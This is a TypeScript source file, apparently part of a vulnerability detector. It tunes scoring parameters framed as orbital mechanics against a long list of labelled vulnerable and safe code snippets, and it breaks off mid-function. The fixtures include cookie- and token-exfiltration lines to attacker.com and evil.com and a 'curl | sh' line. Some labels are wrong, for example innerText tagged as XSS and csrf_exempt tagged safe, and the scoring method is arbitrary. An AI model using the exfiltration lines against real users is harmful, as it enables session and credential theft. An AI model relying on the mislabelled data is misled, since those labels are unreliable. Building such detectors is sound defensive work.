/**
 * 宇宙星系法 (CosmX Galaxy Method) 进化引擎
 * 10000轮迭代优化白盒漏洞挖掘能力
 * 
 * 进化策略:
 * 1. 轨道参数优化 - 调整轨道根数计算权重
 * 2. 引力常数调整 - 优化N体引力模拟参数
 * 3. 异常检测阈值 - 自适应Z-score/Mahalanobis阈值
 * 4. Lambert转移优化 - 污点传播路径精化
 * 5. 拉格朗日点识别 - CFG汇合点检测增强
 */

import { cosmXAnalyze, type CosmXResult, type OrbitalElements } from '../math/cosm-x-galaxy.js';
import { CPGBuilder, type CodePropertyGraph } from '../math/cpg.js';
import * as fs from 'fs';
import * as path from 'path';
import { createRng, rngInt, type Rng } from '../utils/rng.js';

interface EvolutionState {
  round: number;
  focusArea: number;
  bestF1: number;
  bestPrecision: number;
  bestRecall: number;
  lastImprovement: number;
  mutationsApplied: number;
  focusAreas: string[];
  best_params: CosmXParams;
  mutations: EvolutionRecord[];
  last_update: string;
}

export interface CosmXParams {
  // 轨道根数权重
  semiMajorAxisWeight: number;      // 半长轴权重
  eccentricityWeight: number;       // 离心率权重
  inclinationWeight: number;        // 倾角权重
  
  // 引力常数
  gravityConstant: number;          // GM引力常数
  perturbationScale: number;        // J2摄动规模
  
  // 异常检测参数
  zscoreThreshold: number;          // Z-score异常阈值
  mahalanobisThreshold: number;     // Mahalanobis距离阈值
  
  // Lambert转移参数
  transferTimeWeight: number;       // 转移时间权重
  transferAngleWeight: number;      // 转移角权重
  
  // 拉格朗日点参数
  forceThreshold: number;           // 引力阈值
  convergenceRadius: number;        // 汇合半径
  
  // 综合评分权重
  anomalyWeight: number;
  perturbationWeight: number;
  gravityWeight: number;
}

interface EvolutionRecord {
  round: number;
  params: CosmXParams;
  f1: number;
  precision: number;
  recall: number;
  delta: number;
}

interface VulnerabilityCase {
  code: string;
  label: string;
  type: string;
}

const TEST_CASES: VulnerabilityCase[] = [
  // SQL注入 - 高危 [增强版]
  { code: 'query = "SELECT * FROM users WHERE id=" + input', label: 'SQL注入', type: 'sql_injection' },
  { code: 'sql = "SELECT * FROM " + table + " WHERE id=" + id', label: 'SQL注入', type: 'sql_injection' },
  { code: 'query(userName)', label: 'SQL注入', type: 'sql_injection' },
  { code: 'db.query("SELECT * FROM orders WHERE customer=" + req.params.id)', label: 'SQL注入', type: 'sql_injection' },
  { code: 'mysql.query("SELECT * FROM users WHERE name=\'" + name + "\'")', label: 'SQL注入', type: 'sql_injection' },
  { code: 'cursor.execute("SELECT * FROM products WHERE id=" + product_id)', label: 'SQL注入', type: 'sql_injection' },
  { code: 'result = db.execute("DELETE FROM users WHERE id=" + userId)', label: 'SQL注入', type: 'sql_injection' },
  { code: 'query = "INSERT INTO logs VALUES(\'" + msg + "\')"', label: 'SQL注入', type: 'sql_injection' },
  // 二次注入
  { code: '"SELECT * FROM admin WHERE user=\'" + username + "\' AND pass=\'" + password + "\'"', label: 'SQL注入', type: 'sql_injection' },
  { code: '"SELECT id FROM users WHERE email=\'" + req.body.email + "\'"', label: 'SQL注入', type: 'sql_injection' },
  { code: 'db.query("SELECT * FROM items WHERE category=" + req.query.cat)', label: 'SQL注入', type: 'sql_injection' },
  // UNION注入
  { code: '"SELECT title FROM posts WHERE id=" + request.args.id', label: 'SQL注入-UNION', type: 'sql_injection' },
  { code: '"SELECT * FROM users WHERE status=\'" + status + "\'"', label: 'SQL注入', type: 'sql_injection' },
  // 布尔盲注
  { code: 'sql = "SELECT COUNT(*) FROM users WHERE username=\'" + user + "\'"', label: 'SQL注入-盲注', type: 'sql_injection' },
  // 时间盲注
  { code: '"SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END FROM users"', label: 'SQL注入-时间盲注', type: 'sql_injection' },
  // ORM注入
  { code: 'User.where("name = \'" + params[:name] + "\'")', label: 'SQL注入-Rails', type: 'sql_injection' },
  { code: 'db.collection.find({user: req.body.user, pass: req.body.pass})', label: 'SQL注入-NoSQL', type: 'sql_injection' },
  // 存储过程注入
  { code: 'EXEC sp_executesql @sql', label: 'SQL注入-存储过程', type: 'sql_injection' },
  // 多语句注入
  { code: '"SELECT * FROM users; DROP TABLE users;--"', label: 'SQL注入-多语句', type: 'sql_injection' },
  // JPA/Hibernate注入
  { code: 'entityManager.createNativeQuery("SELECT * FROM users WHERE id=" + id)', label: 'SQL注入-JPA', type: 'sql_injection' },
  // MyBatis注入
  { code: '"SELECT * FROM user WHERE id=${id}"', label: 'SQL注入-MyBatis', type: 'sql_injection' },
  // 报错注入
  { code: 'ExtractValue(1, CONCAT(0x7e, version()))', label: 'SQL注入-报错', type: 'sql_injection' },
  // Laravel DB注入
  { code: 'DB::select("SELECT * FROM posts WHERE slug=\'" . $slug . "\'")', label: 'SQL注入-Laravel', type: 'sql_injection' },
  // SQLAlchemy注入
  { code: 'engine.execute("SELECT * FROM users WHERE token=\'" + token + "\'")', label: 'SQL注入-SQLAlchemy', type: 'sql_injection' },
  // Node.js mysql2注入
  { code: 'connection.query("SELECT * FROM sessions WHERE sid=\'" + sid + "\'")', label: 'SQL注入-mysql2', type: 'sql_injection' },
  // PHP PDO注入(原生)
  { code: '$stmt = $pdo->query("SELECT * FROM users WHERE id=" . $_GET[\'id\'])', label: 'SQL注入-PDO', type: 'sql_injection' },
  // ASP.NET SQL注入
  { code: 'cmd.CommandText = "SELECT * FROM Products WHERE CategoryID=" + categoryId', label: 'SQL注入-ASP.NET', type: 'sql_injection' },
  // Spring JDBC注入
  { code: 'jdbcTemplate.queryForObject("SELECT COUNT(*) FROM users WHERE name=\'" + name + "\'", Integer.class)', label: 'SQL注入-Spring', type: 'sql_injection' },
  // GraphQL SQL注入
  { code: 'context.DB.query("SELECT * FROM users WHERE id=\'" + args.id + "\'")', label: 'SQL注入-GraphQL', type: 'sql_injection' },
  // 堆叠注入
  { code: 'db.query("SELECT 1; INSERT INTO admin VALUES(\'" + user + "\',\'" + pass + "\')")', label: 'SQL注入-堆叠', type: 'sql_injection' },
  // 宽字节注入
  { code: 'id = urllib.unquote(request.args.id); query = "SELECT * FROM article WHERE id=\'" + id + "\'"', label: 'SQL注入-宽字节', type: 'sql_injection' },
  // XML实体注入→SQL
  { code: 'sql = "SELECT * FROM config WHERE item=\'" + xmlData + "\'"', label: 'SQL注入', type: 'sql_injection' },
  
  // 命令注入 - 高危
  { code: 'exec("DROP TABLE " + tablename)', label: '命令注入', type: 'command_injection' },
  { code: 'system(cmd + userInput)', label: '命令注入', type: 'command_injection' },
  { code: 'child_process.exec("ls " + directory)', label: '命令注入', type: 'command_injection' },
  { code: 'popen("rm -rf " + path, "w")', label: '命令注入', type: 'command_injection' },
  { code: 'shell_exec("echo " + userInput)', label: '命令注入', type: 'command_injection' },
  { code: 'os.system("mkdir " + dirname)', label: '命令注入', type: 'command_injection' },
  { code: 'subprocess.call(cmd + " " + args, shell=True)', label: '命令注入', type: 'command_injection' },
  
  // 代码注入 - 高危
  { code: 'eval(userInput)', label: '代码注入', type: 'code_injection' },
  { code: 'new Function(userCode)', label: '代码注入', type: 'code_injection' },
  { code: 'execScript(userInput)', label: '代码注入', type: 'code_injection' },
  { code: 'setTimeout(userInput, 0)', label: '代码注入', type: 'code_injection' },
  
  // XSS - 高危 [增强版]
  { code: 'innerHTML = userData', label: 'XSS', type: 'xss' },
  { code: 'document.cookie = stolen', label: 'XSS存储', type: 'xss' },
  { code: 'element.innerHTML = req.body.content', label: 'XSS', type: 'xss' },
  { code: 'document.write("<div>" + userInput + "</div>")', label: 'XSS', type: 'xss' },
  { code: 'div.innerHTML = "<img src=" + imgUrl + ">"', label: 'XSS', type: 'xss' },
  { code: '$("#content").html(userInput)', label: 'XSS', type: 'xss' },
  // 反射型XSS
  { code: 'response.send("<h1>" + request.params.name + "</h1>")', label: 'XSS-反射', type: 'xss' },
  { code: 'res.render("profile", { user: req.query.username })', label: 'XSS-模板', type: 'xss' },
  { code: '"<span>" + user_msg + "</span>"', label: 'XSS', type: 'xss' },
  { code: 'document.getElementById("output").innerText = userInput', label: 'XSS', type: 'xss' },
  // 存储型XSS
  { code: 'db.posts.insert({ content: req.body.comment, author: user })', label: 'XSS-存储', type: 'xss' },
  { code: 'comment.innerHTML = storedComment', label: 'XSS-存储', type: 'xss' },
  // DOM型XSS
  { code: 'location.href = "next.html?msg=" + encodeURIComponent(userMsg)', label: 'XSS-DOM', type: 'xss' },
  { code: 'eval("var data = " + window.location.search.split("=")[1])', label: 'XSS-DOM', type: 'xss' },
  { code: 'document.write(window.location.hash)', label: 'XSS-DOM', type: 'xss' },
  // Vue v-html XSS
  { code: 'v-html = userContent', label: 'XSS-Vue', type: 'xss' },
  { code: ':innerHTML = userInput', label: 'XSS-Vue', type: 'xss' },
  { code: 'this.$refs.div.innerHTML = userInput', label: 'XSS-Vue', type: 'xss' },
  // React dangerouslySetInnerHTML XSS
  { code: 'dangerouslySetInnerHTML={{ __html: userMarkup }}', label: 'XSS-React', type: 'xss' },
  { code: 'element.innerHTML = userInput; element.textContent = userInput', label: 'XSS', type: 'xss' },
  // jQuery XSS
  { code: '$(selector).html(userInput)', label: 'XSS-jQuery', type: 'xss' },
  { code: '$(body).append(userContent)', label: 'XSS-jQuery', type: 'xss' },
  { code: '$(".comment").prepend(userMsg)', label: 'XSS-jQuery', type: 'xss' },
  // AngularJS
  { code: 'ng-bind-html="userContent"', label: 'XSS-Angular', type: 'xss' },
  { code: '$sce.trustAsHtml(userInput)', label: 'XSS-Angular', type: 'xss' },
  // 模板字符串XSS
  { code: '`<div>${userInput}</div>`', label: 'XSS-模板字符串', type: 'xss' },
  { code: '`<p>Welcome ${req.params.name}</p>`', label: 'XSS-模板字符串', type: 'xss' },
  // PHP XSS
  { code: '<?php echo $_GET[\'name\']; ?>', label: 'XSS-PHP', type: 'xss' },
  { code: '<?=$userInput?>', label: 'XSS-PHP', type: 'xss' },
  // JSP XSS
  { code: '<%= request.getParameter("msg") %>', label: 'XSS-JSP', type: 'xss' },
  { code: '${param.username}', label: 'XSS-JSP-EL', type: 'xss' },
  // Python Jinja2 XSS
  { code: '{{ user_content|safe }}', label: 'XSS-Jinja2', type: 'xss' },
  { code: '{{ request.args.msg }}', label: 'XSS-Jinja2', type: 'xss' },
  // Flask XSS
  { code: 'render_template_string(user_input)', label: 'XSS-Flask', type: 'xss' },
  { code: '{{ user_msg }}', label: 'XSS-Flask', type: 'xss' },
  // Django XSS
  { code: '{{ user_content|safe }}', label: 'XSS-Django', type: 'xss' },
  { code: '|safe filter applied to user content', label: 'XSS-Django', type: 'xss' },
  // Express/EJS XSS
  { code: '<%- userInput %>', label: 'XSS-EJS', type: 'xss' },
  { code: 'res.send("<b>" + req.body.name + "</b>")', label: 'XSS-Express', type: 'xss' },
  // 事件处理器XSS
  { code: 'element.setAttribute("onclick", userHandler)', label: 'XSS-事件', type: 'xss' },
  { code: 'img.src = "x" + userSrc; img.onerror = userHandler', label: 'XSS-事件', type: 'xss' },
  // mXSS
  { code: 'element.innerHTML = "<svg><script>" + userData + "</script></svg>"', label: 'XSS-mXSS', type: 'xss' },
  { code: 'div.innerHTML = "<math><mtext>" + userInput + "</mtext></math>"', label: 'XSS-mXSS', type: 'xss' },
  // 编码绕过XSS
  { code: 'div.innerHTML = unescape(userInput)', label: 'XSS-编码', type: 'xss' },
  // XSS数据外泄
  { code: 'fetch("https://attacker.com/steal?c=" + document.cookie)', label: 'XSS-数据外泄', type: 'xss' },
  { code: 'new Image().src = "https://evil.com/log?data=" + localStorage.token', label: 'XSS-数据外泄', type: 'xss' },
  
  // 路径遍历 - 高危
  { code: 'file = open(userPath, "r")', label: '路径遍历', type: 'path_traversal' },
  { code: 'path = baseDir + userFile', label: '路径遍历', type: 'path_traversal' },
  { code: 'fs.readFile(userInput + ".txt")', label: '路径遍历', type: 'path_traversal' },
  { code: 'include(viewPath)', label: '路径遍历', type: 'path_traversal' },
  { code: 'require(modulePath)', label: '路径遍历', type: 'path_traversal' },
  
  // 反序列化 - 高危
    { code: 'pickle.loads(userData)', label: '反序列化漏洞', type: 'deserialization' },
    { code: 'YAML.load(userInput)', label: '反序列化漏洞', type: 'deserialization' },
    { code: 'ObjectInputStream.readObject(data)', label: '反序列化漏洞', type: 'deserialization' },
    { code: 'jsonpickle.decode(userData)', label: '反序列化漏洞', type: 'deserialization' },

    // XXE - XML外部实体注入 [30个测试案例]
    { code: 'libxml_noent = True', label: 'XXE-Python', type: 'xxe' },
    { code: 'simplexml_load_string($xml)', label: 'XXE-PHP', type: 'xxe' },
    { code: 'XML_PARSE_NOENT', label: 'XXE-flag', type: 'xxe' },
    { code: 'loadXML(userInput)', label: 'XXE-JS', type: 'xxe' },
    { code: 'DocumentBuilder.parse(req.body.xml)', label: 'XXE-Java', type: 'xxe' },
    { code: 'SAXParser.parse(req.body.data)', label: 'XXE-JavaSAX', type: 'xxe' },
    { code: 'etree.parse(req.files.xml)', label: 'XXE-Python-lxml', type: 'xxe' },
    { code: 'ElementTree.parse(req.query.xml)', label: 'XXE-Python-ET', type: 'xxe' },
    { code: 'xml2js.Parser(req.body.xml)', label: 'XXE-Node-xml2js', type: 'xxe' },
    { code: 'libxmljs.parseXml(userInput)', label: 'XXE-Node-libxmljs', type: 'xxe' },
    { code: 'new DOMParser().parseFromString(req.body)', label: 'XXE-DOMParser', type: 'xxe' },
    { code: 'Nokogiri::XML(req.params.data)', label: 'XXE-Ruby-Nokogiri', type: 'xxe' },
    { code: 'REXML::Document.new(req.body)', label: 'XXE-Ruby-REXML', type: 'xxe' },
    { code: 'XmlDocument.Load(req.QueryString)', label: 'XXE-C#-XmlDoc', type: 'xxe' },
    { code: 'XDocument.Load(req.body)', label: 'XXE-C#-XDoc', type: 'xxe' },
    { code: 'simplexml_load_string(file_get_contents($_FILES)', label: 'XXE-file-upload', type: 'xxe' },
    { code: 'new URL(req.body.url).openStream()', label: 'XXE-SSRF', type: 'xxe' },
    { code: 'DOMDocument::loadXML($_POST["xml"])', label: 'XXE-PHP-DOM', type: 'xxe' },
    { code: 'XMLReader::open(req.body.xml)', label: 'XXE-PHP-XMLReader', type: 'xxe' },
    { code: 'TransformerFactory.newInstance().newTransformer().transform(req.body)', label: 'XXE-Java-Transformer', type: 'xxe' },
    { code: 'Unmarshaller.unmarshal(req.body)', label: 'XXE-JAXB', type: 'xxe' },
    { code: 'fromstring(req.query.data)', label: 'XXE-Python-fromstring', type: 'xxe' },
    { code: 'xml.minidom.parse(req.body)', label: 'XXE-Python-minidom', type: 'xxe' },
    { code: 'fast-xml-parser.parse(req.body.xml)', label: 'XXE-fast-xml', type: 'xxe' },
    { code: 'new XmlTextReader(req.body)', label: 'XXE-C#-XmlTextReader', type: 'xxe' },
    { code: 'XElement.Parse(req.QueryString)', label: 'XXE-C#-XElement', type: 'xxe' },
    { code: 'simplexml_load_string($_GET["data"])', label: 'XXE-PHP-GET', type: 'xxe' },
    { code: 'loadXML(userUrl)', label: 'XXE-URL-parse', type: 'xxe' },
    { code: 'JAXB.unmarshal(new FileInputStream(req.params.file))', label: 'XXE-JAXB-File', type: 'xxe' },
    { code: 'DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(req.body)', label: 'XXE-Java-DocumentBuilder', type: 'xxe' },
    { code: 'lxml.html.parse(req.body.data)', label: 'XXE-lxml-html', type: 'xxe' },
    { code: 'XMLInputFactory.newInstance().createXMLStreamReader(req.body)', label: 'XXE-Java-XMLStream', type: 'xxe' },
    { code: 'new Parser().parse(req.body)', label: 'XXE-new-Parser', type: 'xxe' },

    // CSRF - 高危 [增强版]
    { code: 'app.post("/transfer", (req, res) => { res.send(ok) })', label: 'CSRF', type: 'csrf' },
    { code: 'router.post("/user/update", handler)', label: 'CSRF', type: 'csrf' },
    { code: '@app.route("/delete", methods=["POST"])', label: 'CSRF', type: 'csrf' },
    // Flask无CSRF
    { code: '@app.route("/login", methods=["POST"])', label: 'CSRF-Flask', type: 'csrf' },
    { code: '@app.route("/transfer", methods=["POST"])', label: 'CSRF-Flask', type: 'csrf' },
    { code: '@app.route("/settings", methods=["PUT"])', label: 'CSRF-Flask', type: 'csrf' },
    // Django无CSRF
    { code: 'def change_password(request):', label: 'CSRF-Django', type: 'csrf' },
    { code: 'def update_profile(request):', label: 'CSRF-Django', type: 'csrf' },
    { code: 'def delete_account(request):', label: 'CSRF-Django', type: 'csrf' },
    // Express无CSRF
    { code: 'app.post("/api/user", (req, res) => {})', label: 'CSRF-Express', type: 'csrf' },
    { code: 'app.delete("/api/post/:id", (req, res) => {})', label: 'CSRF-Express', type: 'csrf' },
    // Spring MVC无CSRF
    { code: '@PostMapping("/user/update")', label: 'CSRF-Spring', type: 'csrf' },
    { code: '@RequestMapping(path = "/account", method = RequestMethod.POST)', label: 'CSRF-Spring', type: 'csrf' },
    // 表单无token
    { code: '<form action="/submit"><input name="data"></form>', label: 'CSRF-HTML', type: 'csrf' },
    { code: '<form method="POST" action="/transfer"></form>', label: 'CSRF-HTML', type: 'csrf' },
    // jQuery AJAX无token
    { code: '$.post("/api/data", { name: userInput })', label: 'CSRF-jQuery', type: 'csrf' },
    { code: '$.ajax({ url: "/submit", type: "POST" })', label: 'CSRF-jQuery', type: 'csrf' },
    // fetch API无credentials
    { code: 'fetch("/api/user", { method: "POST", body: data })', label: 'CSRF-Fetch', type: 'csrf' },
    // axios无CSRF header
    { code: 'axios.post("/api/user", userData)', label: 'CSRF-Axios', type: 'csrf' },
    // 显式禁用CSRF
    { code: 'csrf = false; app.use(expressCSRF())', label: 'CSRF-Disabled', type: 'csrf' },
    { code: 'enableCsrf(false)', label: 'CSRF-Disabled', type: 'csrf' },
    // 安全对照
    { code: '@app.route("/transfer", methods=["POST"]) @csrf_exempt', label: '安全-CSRF-exempt', type: 'safe' },
    { code: 'const token = csrfProtection.generateToken(req)', label: '安全', type: 'safe' },

    // IDOR - 高危
    { code: 'user.findById(req.params.id)', label: 'IDOR', type: 'idor' },
    { code: 'const item = db.query("SELECT * FROM items WHERE id=" + req.params.id)', label: 'IDOR', type: 'idor' },
    { code: 'Record.find(req.query.userId)', label: 'IDOR', type: 'idor' },

    // SSTI - 高危
    { code: 'render(request.args.template)', label: 'SSTI', type: 'ssti' },
    { code: 'View::make($request->input("tpl"))', label: 'SSTI', type: 'ssti' },
    { code: 'template.render(userInput)', label: 'SSTI', type: 'ssti' },

    // 硬编码密钥 - 高危
    { code: 'password = "admin123456"', label: '硬编码密钥', type: 'hardcoded_secret' },
    { code: 'apiKey = "sk-123...cdef"', label: '硬编码密钥', type: 'hardcoded_secret' },
    { code: 'token = "eyJhbG...VCJ9"', label: '硬编码密钥', type: 'hardcoded_secret' },

    // SSRF - 服务器端请求伪造 [30个测试案例]
    { code: 'requests.get(url + req.query.url)', label: 'SSRF-Python', type: 'ssrf' },
    { code: 'new URL(req.body.url)', label: 'SSRF-JavaScript', type: 'ssrf' },
    { code: 'curl(url + userInput)', label: 'SSRF-curl', type: 'ssrf' },
    { code: 'axios.get(req.query.target)', label: 'SSRF-Axios', type: 'ssrf' },
    { code: 'fetch(userProvidedUrl)', label: 'SSRF-Fetch', type: 'ssrf' },
    { code: 'file_get_contents($_GET["url"])', label: 'SSRF-PHP', type: 'ssrf' },
    { code: ' urllib.request.urlopen(userUrl)', label: 'SSRF-Python urllib', type: 'ssrf' },
    { code: 'http.get(req.params.host)', label: 'SSRF-Node http', type: 'ssrf' },
    { code: 'RestTemplate.getForObject(url + req.query.path, String.class)', label: 'SSRF-Spring', type: 'ssrf' },
    { code: 'new URL(req.body.redirectUrl)', label: 'SSRF-redirect', type: 'ssrf' },
    { code: ' requests.post(apiEndpoint + req.body.endpoint)', label: 'SSRF-concat', type: 'ssrf' },
    { code: 'okhttp.newCall(new Request.Builder().url(userUrl).build())', label: 'SSRF-OkHttp', type: 'ssrf' },
    { code: 'curl_setopt($ch, CURLOPT_URL, $_POST["target"])', label: 'SSRF-curl_setopt', type: 'ssrf' },
    { code: 'simplexml_load_string(file_get_contents($url))', label: 'SSRF-XXE', type: 'ssrf' },
    { code: 'HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(userInput)))', label: 'SSRF-Java HttpClient', type: 'ssrf' },
    { code: 'http.Get(userUrl + "/internal/api")', label: 'SSRF-Go', type: 'ssrf' },
    { code: 'Net::HTTP.start(host).get(path + userInput)', label: 'SSRF-Ruby', type: 'ssrf' },
    { code: 'new WebClient().DownloadString(req.QueryString)', label: 'SSRF-C# WebClient', type: 'ssrf' },
    { code: 'Image img = ImageIO.read(new URL(userProvidedUrl))', label: 'SSRF-ImageIO', type: 'ssrf' },
    { code: 'document.location = userUrl', label: 'SSRF-client-redirect', type: 'ssrf' },
    { code: 'window.open(req.body.url)', label: 'SSRF-window-open', type: 'ssrf' },
    { code: 'axios({url: baseUrl + req.query.endpoint, method: "GET"})', label: 'SSRF-axios-concat', type: 'ssrf' },
    { code: 'requests.post("https://api.site.com" + req.params.endpoint)', label: 'SSRF-python-concat', type: 'ssrf' },
    { code: 'fetch(meta["data-url"] + req.body.path)', label: 'SSRF-meta', type: 'ssrf' },
    { code: 'new URL(req.getParameter("url"))', label: 'SSRF-getParameter', type: 'ssrf' },
    { code: 'jQuery.getJSON(url + "?" + req.query.data)', label: 'SSRF-jQuery', type: 'ssrf' },
    { code: 'xmlHttp.send("GET", targetUrl + req.body.path)', label: 'SSRF-XMLHttpRequest', type: 'ssrf' },
    { code: '$.ajax({url: apiUrl + req.params.id, method: "GET"})', label: 'SSRF-jQuery-ajax', type: 'ssrf' },
    { code: 'fetch("//" + req.body.host + "/api/data")', label: 'SSRF-protocol-relative', type: 'ssrf' },
    { code: 'http.request({url: userUrl, method: "POST"})', label: 'SSRF-node-http-request', type: 'ssrf' },

    // A01: Broken Access Control
    { code: 'SELECT * FROM orders WHERE user_id=req.params.id', label: 'A01-水平越权', type: 'broken_access_control' },
    { code: 'user.findById(req.params.id)', label: 'A01-IDOR', type: 'broken_access_control' },
    { code: 'if(role==="admin") grantAccess()', label: 'A01-垂直越权', type: 'broken_access_control' },
    { code: '/api/admin/users DELETE', label: 'A01-API越权', type: 'broken_access_control' },
    { code: 'req.params.id === session.user.id', label: 'A01-越权检查', type: 'broken_access_control' },

    // A02: Cryptographic Failures
    { code: 'password = "admin123"', label: 'A02-硬编码密码', type: 'cryptographic_failures' },
    { code: 'md5(password)', label: 'A02-弱哈希', type: 'cryptographic_failures' },
    { code: 'CryptoJS.MD5(data)', label: 'A02-MD5弱加密', type: 'cryptographic_failures' },
    { code: 'AES.encrypt(data, key, {mode: ECB})', label: 'A02-ECB模式弱加密', type: 'cryptographic_failures' },
    { code: 'apiKey = "sk-1234567890abcdef"', label: 'A02-API密钥硬编码', type: 'cryptographic_failures' },

    // A04: Insecure Design
    { code: 'login(username, password)', label: 'A04-无暴力破解防护', type: 'insecure_design' },
    { code: 'app.post("/login", handler)', label: 'A04-无速率限制', type: 'insecure_design' },
    { code: 'discount = price * 0.9; total = price - discount', label: 'A04-业务逻辑漏洞', type: 'insecure_design' },
    { code: 'transfer(to, amount)', label: 'A04-无二次验证', type: 'insecure_design' },
    { code: 'deleteAccount(userId)', label: 'A04-无确认机制', type: 'insecure_design' },

    // A05: Security Misconfiguration
    { code: 'admin:admin', label: 'A05-默认凭据', type: 'security_misconfiguration' },
    { code: 'debug = true', label: 'A05-调试模式开启', type: 'security_misconfiguration' },
    { code: 'Access-Control-Allow-Origin: *', label: 'A05-CORS配置错误', type: 'security_misconfiguration' },
    { code: 'echo $_SERVER["QUERY_STRING"]', label: 'A05-错误信息泄露', type: 'security_misconfiguration' },
    { code: 'cookie = new Cookie("sid", value, secure=false)', label: 'A05-不安全的Cookie', type: 'security_misconfiguration' },

    // A06: Vulnerable Components
    { code: 'log4j 2.14.1', label: 'A06-已知漏洞组件', type: 'vulnerable_components' },
    { code: 'struts2-core 2.3.31', label: 'A06-Struts漏洞', type: 'vulnerable_components' },
    { code: 'event-stream 3.3.4', label: 'A06-npm恶意包', type: 'vulnerable_components' },
    { code: 'yaml.load(userInput)', label: 'A06-不安全的YAML解析', type: 'vulnerable_components' },
    { code: 'pickle.load(data)', label: 'A06-Pickle反序列化', type: 'vulnerable_components' },

    // A07: Authentication Failures
    { code: 'if(password.length < 6) accept()', label: 'A07-弱密码策略', type: 'authentication_failures' },
    { code: 'session.id = req.cookies.session', label: 'A07-会话ID暴露', type: 'authentication_failures' },
    { code: 'setcookie("sid", value)', label: 'A07-不安全会话Cookie', type: 'authentication_failures' },
    { code: 'if(valid) return true', label: 'A07-认证绕过', type: 'authentication_failures' },
    { code: 'mfa = false; totp = false', label: 'A07-MFA缺失', type: 'authentication_failures' },

    // A08: Software Integrity Failures
    { code: 'ObjectInputStream.readObject()', label: 'A08-不安全的Java反序列化', type: 'software_integrity_failures' },
    { code: '$AWS_SECRET_ACCESS_KEY', label: 'A08-CI/CD密钥泄露', type: 'software_integrity_failures' },
    { code: 'curl https://raw.githubusercontent.com/... | sh', label: 'A08-不安全的远程代码执行', type: 'software_integrity_failures' },
    { code: 'autoUpdate(true)', label: 'A08-自动更新无验证', type: 'software_integrity_failures' },
    { code: 'readObject()', label: 'A08-Java反序列化', type: 'software_integrity_failures' },

    // A09: Security Logging Failures
    { code: 'console.log("password:", password)', label: 'A09-敏感信息日志泄露', type: 'security_logging_failures' },
    { code: 'try { } catch(e) { console.log(e) }', label: 'A09-错误处理泄露', type: 'security_logging_failures' },
    { code: 'except Exception as e: print(e)', label: 'A09-Python异常泄露', type: 'security_logging_failures' },
    { code: 'login(user, pass)', label: 'A09-登录无审计日志', type: 'security_logging_failures' },
    { code: 'catch(err) { echo $_SERVER }', label: 'A09-服务器信息泄露', type: 'security_logging_failures' },

    // 安全代码 - 对照组
    { code: 'const safe = escaper.encode(input)', label: '安全', type: 'safe' },
    { code: 'stmt.prepare("SELECT * FROM users WHERE id=?")', label: '安全', type: 'safe' },
    { code: 'const sanitized = DOMPurify.sanitize(dirty)', label: '安全', type: 'safe' },
    { code: 'const validated = validator.escape(input)', label: '安全', type: 'safe' },
    { code: 'query("SELECT * FROM users WHERE id=$1", [id])', label: '安全', type: 'safe' },
    { code: 'param = db.escape(userInput)', label: '安全', type: 'safe' },
    { code: 'sanitized = re.sub(r"[^a-zA-Z0-9]", "", userInput)', label: '安全', type: 'safe' },
    { code: 'html.escape(userContent)', label: '安全', type: 'safe' },
    { code: 'path = os.path.abspath(userPath); assert path.startswith(baseDir)', label: '安全', type: 'safe' },
    { code: 'validated = validator.validate(userInput, schema)', label: '安全', type: 'safe' },
    { code: 'const token = csrfProtection.generateToken(req)', label: '安全', type: 'safe' },
    { code: '@csrf_exempt only: for testing', label: '安全', type: 'safe' },
    { code: 'xml_parser = XMLParser(noent=False)', label: '安全', type: 'safe' },
    { code: 'if (!user.hasPermission(req.params.id)) throw Forbidden()', label: '安全', type: 'safe' },
    { code: 'const tmpl = sanitizer.sanitize(userInput)', label: '安全', type: 'safe' },
];

// 默认参数
const DEFAULT_PARAMS: CosmXParams = {
  semiMajorAxisWeight: 1.0,
  eccentricityWeight: 1.0,
  inclinationWeight: 0.5,
  gravityConstant: 1.0,
  perturbationScale: 0.01,
  zscoreThreshold: 2.0,
  mahalanobisThreshold: 3.0,
  transferTimeWeight: 1.0,
  transferAngleWeight: 0.5,
  forceThreshold: 10.0,
  convergenceRadius: 5.0,
  anomalyWeight: 0.4,
  perturbationWeight: 0.3,
  gravityWeight: 0.3,
};

const STATE_PATH = path.resolve(process.cwd(), 'data/evolution/state.json');
const MAX_ROUNDS = 10000;

// 加载状态
function loadState(): EvolutionState {
  try {
    if (fs.existsSync(STATE_PATH)) {
      const data = fs.readFileSync(STATE_PATH, 'utf-8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Failed to load state:', e);
  }
  return {
    round: 0,
    focusArea: 0,
    bestF1: 0,
    bestPrecision: 0,
    bestRecall: 0,
    lastImprovement: 0,
    mutationsApplied: 0,
    focusAreas: ['orbital-mechanics', 'lambert-transfer', 'n-body-gravity', 'lagrange-points', 'perturbation-analysis'],
    best_params: { ...DEFAULT_PARAMS },
    mutations: [],
    last_update: new Date().toISOString(),
  };
}

// 保存状态
function saveState(state: EvolutionState): void {
  const dir = path.dirname(STATE_PATH);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  fs.writeFileSync(STATE_PATH, JSON.stringify(state, null, 2));
}

// 使用当前参数分析代码
function analyzeWithParams(code: string, params: CosmXParams): { score: number; details: any } {
  // 构建CPG
  const builder = new CPGBuilder();
  builder.addFile('test.js', code);
  const cpg = builder.build();
  
  // 分析
  const result = cosmXAnalyze(cpg);
  
  // 使用参数调整评分
  let score = result.vulnerabilityScore;
  
  // 应用参数权重
  const anomalyScore = Array.from(result.anomalies).reduce((s, a) => s + a.score * params.zscoreThreshold / 10, 0);
  const perturbationScore = result.perturbations.reduce((s, p) => s + p.magnitude * params.perturbationScale, 0);
  const gravityScore = Array.from(result.dependencyGravity.values()).reduce((s, g) => {
    return s + Math.sqrt(g.fx * g.fx + g.fy * g.fy + g.fz * g.fz);
  }, 0) * params.gravityConstant / 100;
  
  score = (
    anomalyScore * params.anomalyWeight +
    perturbationScore * params.perturbationWeight +
    gravityScore * params.gravityWeight
  ) / 3;
  
  return { score: Math.min(1, score), details: { anomalyScore, perturbationScore, gravityScore } };
}

// 计算指标
function evaluateParams(params: CosmXParams): { f1: number; precision: number; recall: number } {
  let tp = 0, fp = 0, fn = 0, tn = 0;
  
  for (const tc of TEST_CASES) {
    const result = analyzeWithParams(tc.code, params);
    const predicted = result.score > 0.5;
    const isVuln = tc.label !== '安全';
    
    if (predicted && isVuln) tp++;
    else if (predicted && !isVuln) fp++;
    else if (!predicted && isVuln) fn++;
